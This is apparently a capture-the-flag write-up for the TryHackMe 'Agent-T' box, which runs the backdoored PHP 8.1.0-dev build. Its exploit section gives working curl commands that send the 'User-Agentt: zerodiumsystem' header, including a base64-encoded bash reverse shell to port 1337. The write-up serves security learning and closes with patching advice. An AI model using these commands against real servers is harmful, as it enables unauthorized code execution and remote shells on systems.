# Agent-T Writeup

Name: Agent-T
Date:  09/01/2023
Description: Something seems a little off with the server.
Better Description: Backdoor o'clock
Difficulty:  Easy
Goals:  
- Quick B2R as I going loads of everything else today.
Learnt:
- Supply Chain attacks are pretty awesome
Beyond Root:
- Patch it

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](TryHackMe/Markdown/Agent-T/Screenshots/ping.png)

![](nmapscan.png)

## Exploit

Nmap discovery script found 8.1.0-dev in the header information. 
![](php8-1-0dev.png)
8.1.0-dev was victim to a supply-chain attack and a backdoor was place when using the header to run arbituary PHP code:
```php
// everything after the system will be executed as a php system command 
"User-Agentt": "zerodiumsystem('" + cmd + "');"
```

For a good 16 minute video by [John Hammond](https://www.youtube.com/watch?v=j-wmhJ8u5Ws) and the [Github](https://github.com/flast101/php-8.1.0-dev-backdoor-rce)

For some reason this should work, but I thought I forgot escape quotations and I am leaving this here as a reminder and testiment to handling quotes workflow. Although actually it is `('"<cmd>"')` reading issue I had.
```bash
# create the variable to be copy and paste lazy 
base64encodedpayload=$(echo "/bin/bash -c 'exec bash -i &>/dev/tcp/$ip/1337 <&1'" | base64 -w0)
curl http://10.10.129.151  -H 'User-Agentt: zerodiumsystem("echo $base64encodedpayload | base64 -d | bash");' -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
```

Regardless

```bash
curl http://10.10.129.151  -H "User-Agentt: zerodiumsystem('echo $base64encodedpayload | base64 -d | bash');" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
```

## Foothold && PrivEsc

And we are Root
![](root.png)

## Beyond Root

This box was very easy, but I want to practice and showcase patching this. Also I want to try manual without lookup finding the code and patching it. We are also ina docker container so I could try a container escape.
![](weareinadockercontainer.png)

Patching - downgrade to 8.0 or upgrade to a later version
